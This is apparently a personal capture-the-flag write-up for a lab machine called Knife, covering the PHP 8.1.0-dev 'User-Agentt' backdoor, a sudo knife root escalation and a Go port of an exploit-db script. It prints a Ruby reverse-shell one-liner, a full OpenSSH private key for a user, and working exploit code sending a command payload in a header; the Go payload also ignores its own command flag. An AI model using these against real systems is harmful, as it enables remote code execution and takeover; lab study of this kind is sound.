# Knife Writeup

Name: Knife
Date:  26/2/2026
Difficulty:  Easy
Goals:  
- Easy machine to feel good in more hard times
Learnt:
- Go http library
- versions, versions, versions
Beyond Root:
- Code an exploit PoC

- [[Knife-Notes.md]]
- [[Knife-CMD-by-CMDs.md]]


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](ping.png)

Then I became enumeration all TCP ports with `nmap` to speed up following scans
![](nmap-tcp.png)

Then `-sC` and `-sV` for default scripts
![](nmp-sc-sv.png)

Went to the web site on port 80.
![](www-root.png)

There is javascript `<script>`, but their is very little in term of functionality.
![](penjs.png)

Which should have been a rabbithole end-state indicator of solution.
![](gospiderisanospider.png)
As I puzzled for a bit with some fuzzing and directory busting tools then went guided mode. The second question was php version, which I forgot to check. PHP major releases often have zero or n-day.
![](forgot.png)
## Exploit

This was a infamous vulnerability of that year, there is a whole room dedicated to it on THM
![](php810.png)

## Foothold

So simply enough a shell is gained,  via using the `User-Agentt` HTTP Header with a command that is just a simple bash reverse shell.
![](james.png)
James rsa key
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
## Privilege Escalation

Before even uploading LinPeas I went through the initial PrivEsc checks manually and actually started with `sudo -l`: 
![](nopasswdsudoknife.png)

Knife is a ruby application that with `sudo nopasswd`
![](gtfobinsknife.png)
basically it can execute anything at a root level. The initial thinking about a shell went to this, although looking though in code it seemed like the wrong choice.
```ruby
knife exec -E 'ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)''
```
I thought against the reverse shell as I could not find any documentation on `-rsockets` - dorking problems circa late 2024 still an issue.

So I looked up exec() and system() functions to use to just exec another bash shell:
![](root.png)
ROOT!
![](root2.png)
## Post-Root-Reflection  

Always remember to check all versions
- Server
- Web server
- Database
- ...

## Beyond Root

Rewrite the exploitdb 49933.py in golang no ai one hour - https://www.exploit-db.com/exploits/49933

```go
package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// Thanks to https://www.digitalocean.com/community/tutorials/how-to-make-http-requests-in-go
// https://dev.to/jones_charles_ad50858dbc0/mastering-http-clients-in-go-your-guide-to-the-nethttp-package-2d8b
func main() {
	gracefulShutdown := make(chan os.Signal, 1)
	signal.Notify(gracefulShutdown, syscall.SIGINT, syscall.SIGTERM)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	var targetURL string
	var cmd string

	flag.StringVar(&targetURL, "u", "", "target URL like 'http://69.69.69.69:9000'")
	flag.StringVar(&cmd, "c", "", "Enter a OS command here like 'whoami'")
	flag.Parse()

	if len(os.Args) != 5 {
		fmt.Printf("Number of flags(2) and args(2) provide does not equal 4: %v", os.Args)
		os.Exit(1)
	}

	payloadBuilder := strings.Builder{}
	payloadBuilder.WriteString("zerodiumsystem('" + "whoami" + "');)")

	requestURL := fmt.Sprintf("%s", targetURL)
	req, err := http.NewRequestWithContext(ctx, "POST", requestURL, nil)
	if err != nil {
		fmt.Printf("Request creation failed: %v", err)
		os.Exit(1)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")
	req.Header.Set("User-Agentt", payloadBuilder.String())

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("client: error making http request: %s\n", err)
		os.Exit(1)
	}

	fmt.Printf("client: got response!\n")
	fmt.Printf("client: status code: %d\n", res.StatusCode)

	resBody, err := io.ReadAll(res.Body)
	if err != nil {
		fmt.Printf("client: could not read response body: %s\n", err)
		os.Exit(1)
	}

	fmt.Printf("client: response body: %s\n", string(resBody))

	<-gracefulShutdown
	_, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer handleTermination(cancel)
}

func handleTermination(cancel context.CancelFunc) {
	fmt.Printf("Terminating application...\n")
	log.Printf("Terminating application\n")
	cancel()
	os.Exit(0)
}


```